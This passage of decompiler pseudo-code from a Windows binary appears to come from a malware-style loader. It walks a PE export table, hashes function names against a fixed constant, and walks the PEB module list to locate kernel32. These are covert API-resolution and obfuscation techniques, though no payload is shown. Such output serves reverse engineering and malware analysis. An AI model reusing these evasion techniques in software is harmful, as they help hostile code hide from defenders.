			word16 dx_302 = (word16) (word32) Mem296[Mem296[fp + 0xFFFF7720:word32] + 0x00000002:word16];
			word16 cx_304 = (word16) (word32) Mem296[edi_279 + 0xFFFFF774:word16];
			Mem305[edi_279 + 0xFFFFF774:word32] = Mem296[eax_290 + 0xFFFFF774:word32];
			Mem309[Mem305[fp + 0xFFFF7720:word32] + 0x00000004:word16] = (word16) (word32) Mem305[eax_290 - 0x00000888:word16];
			byte al_311 = (byte) (word32) Mem309[fp + 0xFFFF7725:byte];
			Mem312[eax_290 - 0x0000088A:word16] = dx_302;
			Mem313[eax_290 - 0x00000888:byte] = al_311;
			Mem315[Mem313[fp + 0xFFFF771C:word32] + 0xFFFFF774:word16] = cx_304;
			cl_261 = 0x01;
			edx_263 = ebx_285;
			goto l0040124B;
		}
	}
l0040166C:
	return;
}

word32 fn00403390(word32 dwArg04, word32 dwArg08)
{
	word32 edx_128;
	word32 ebx_151 = Mem0[0x0040603C:word32];
	word32 edi_26 = dwArg08 | ebx_151;
	word32 edx_30 = dwArg08 - (dwArg08 | 0x00000001) *s ebx_151 + Mem0[(edi_26 + 0x00000078) + Mem0[dwArg08 + 0x0000003C:word32]:word32];
	word32 eax_37 = Mem0[edx_30 + 0x00000018:word32];
	word32 ebp_153 = fp - 0x00000004;
	word32 esp_15 = fp - 0x000000AC;
	word32 dwLoc84_157 = ebx_151;
	word32 eax_31 = Mem0[edx_30 + 0x00000024:word32];
	word32 ecx_34 = Mem0[edx_30 + 0x00000020:word32];
	if (SEQ(SEQ(0x00000000, eax_37) % (ebx_151 + 0x00000001), eax_37) /u (ebx_151 + 0x00000001) != 0x00000000)
	{
		word32 dwLoc88_137 = 0x00000000;
		word32 ecx_139 = ecx_34 - (ecx_34 | 0x00000001) *s ebx_151 + dwArg08;
		word32 dwLoc8C_142 = edi_26 + eax_31;
		while (true)
		{
			word32 ecx_161 = dwArg08 + ecx_139[dwLoc88_137 * 0x00000004];
			Mem163[ebp_153 - 0x0000000D:byte] = 0x00;
			word32 esi_162 = 0x00000000;
			byte al_167 = (byte) (word32) Mem163[ecx_161 + 0x00000000:byte];
			if (al_167 != 0x00)
			{
				word32 edi_298 = 0x00000000;
				do
				{
					if (ebx_151 != 0x00000000)
					{
						word32 eax_381 = SEQ(SEQ(0x00000000, eax_319) % ebx_151, eax_319) /u ebx_151;
						eax_319 = SEQ(SEQ(0x00000000, eax_381) % ebx_151, eax_381) /u ebx_151;
					}
					word32 eax_328 = ebx_151 + 0x00000001;
					byte dl_326 = (byte) eax_319;
					word32 ecx_331 = eax_328 *s Mem163[0x00406028:word32];
					if (ecx_331 == 0x00000000)
					{
						word32 edx_353 = (int32) dl_326;
						Mem360[esi_162 - 0x0000006E + (fp - 0x00000004):byte] = (byte) (edx_353 - (edx_353 | 0x00000001) *s ebx_151);
					}
					else
					{
						word32 edx_364 = SEQ(0x00000000, fp - 0x00000012) % eax_328;
						Mem367[esp_15 + 0x00000004:word32] = SEQ(edx_364, fp - 0x00000012) /u eax_328;
						word32 eax_369 = fp - 0x00000072 + edi_298;
						Mem371[esp_15 + 0x00000000:word32] = eax_369;
						ecx_331();
						ebx_151 = Mem371[0x0040603C:word32];
						esp_15 = esp_15 - 0x00000008;
					}
					esi_162 = esi_162 + 0x00000001;
					edi_298 = esi_162;
					al_167 = (byte) (word32) Mem163[ecx_161 + esi_162:byte];
				} while (al_167 == 0x00);
			}
			word32 edx_184 = ebx_151 + 0x00000030;
			if (edx_184 > esi_162)
			{
				word32 eax_284 = fp - 0x00000072 + esi_162;
				word32 esi_288 = esi_162;
				do
				{
					Mem292[eax_284 + 0x00000000:byte] = 0x00;
					esi_288 = esi_288 + 0x00000001;
					eax_284 = eax_284 + 0x00000001;
				} while (edx_184 > esi_288);
			}
			word32 ecx_192 = 0x00000001;
			word32 eax_194 = dwLoc84_157 | dwArg04;
			do
			{
				word32 edx_206 = (fp - 0x00000076)[ecx_192 * 0x00000004];
				if (ebx_151 != 0x00000000)
					edx_206 = edx_206 * 0x00000002;
				ecx_192 = ecx_192 + 0x00000001;
				eax_194 = eax_194 ^ edx_206;
			} while (ecx_192 != 0x0000000D);
			if (eax_194 != 0xFFFFFFFF)
			{
				word32 ecx_240 = ebx_151 - 0x00000001;
				if (SEQ(0x00000000, eax_194) % ecx_240 == 0x897156A3)
				{
					edx_128 = 0xFFFFFFFF;
					word32 eax_256 = ((ebx_151 + 0x00000001) *s (dwArg08 + Mem163[edx_30 + 0x0000001C:word32]))[(word32) Mem163[dwLoc8C_142 + 0x00000000:word16] * 0x00000004] + dwArg08;
					if (eax_256 != 0xFFFFFFFF)
						return SEQ(0x00000000, eax_256) % ecx_240;
					else
						goto l00403542;
				}
			}
l00403510:
			word32 v17_224 = dwLoc88_137 + 0x00000001;
			word32 edi_226 = Mem163[edx_30 + 0x00000018:word32];
			word32 esi_223 = ebx_151 + 0x00000001;
			dwLoc88_137 = v17_224;
			if (SEQ(SEQ(0x00000000, edi_226) % esi_223, edi_226) /u esi_223 <=u v17_224)
				goto l00403540;
			dwLoc8C_142 = dwLoc8C_142 + 0x00000002;
			dwLoc84_157 = ebx_151;
		}
	}
	else
	{
		edx_128 = 0x00000000;
l00403542:
		return edx_128;
	}
fn00403390_exit:
}

word32 fn00403590(selector fs)
{
	word32 esi_21 = Mem0[0x0040603C:word32];
	word32 ebx_22 = Mem0[Mem0[Mem0[fs:0x00000018:word32] + 0x00000030:word32] + 0x0000000C:word32];
	word32 edi_31 = Mem0[SEQ(SEQ(0x00000000, esi_21) % (ebx_22 | 0x00000001), esi_21) /u (ebx_22 | 0x00000001) + 0x0000001C + ebx_22:word32];
	word32 ecx_101 = edi_31 - (edi_31 | 0x00000001) *s esi_21;
	byte al_39 = (byte) ((esi_21 + 0x00000001) *s 0x0000006B);
	byte al_48 = (byte) ((esi_21 + 0x00000001) *s 0x00000072);
	byte dl_51 = (byte) (((esi_21 - 0x446F8657 >>u 0x00000001) + 0x446F8657 >>u 0x00000006) + 0x00000065);
	do
	{
		word32 edx_104;
		word32 eax_56 = Mem0[ecx_101 + 0x00000020:word32];
		if (Mem0[eax_71 + 0x00000000:byte] == (byte) ((word32) al_39))
			if (Mem0[eax_71 + 0x00000002:byte] == (byte) ((word32) dl_51))
				if (Mem0[eax_71 + 0x00000004:byte] == (byte) ((word32) al_48))
					if (ebx_129 != 0xFFFFFFFF)
						edx_104 = SEQ(0x00000000, ebx_129) % (esi_21 - 0x00000002);
l004035F1:
		ecx_101 = Mem0[ecx_101 + 0x00000000:word32] | esi_21;
	} while (edi_31 == Mem0[ecx_101 + 0x00000000:word32]);
	edx_104 = 0x00000000;
l00403636:
	return edx_104;
}

void fn00403640(word32 eax, word32 dwArg00)
{
fn00403640_entry:
l00403640:
	word32 ecx_10 = fp + 0x00000004
l00403646:
	branch eax <u 0x00001000 l0040365D
l0040364D:
	ecx_10 = ecx_10 - 0x00001000
	Mem18[ecx_10 + 0x00000000:word32] = Mem0[ecx_10 + 0x00000000:word32] | 0x00000000
	eax = eax - 0x00001000
	goto l00403646
l0040365D:
	word32 ecx_22 = ecx_10 - eax
	Mem24[ecx_22 + 0x00000000:word32] = Mem0[ecx_22 + 0x00000000:word32] | 0x00000000
fn00403640_exit:
}

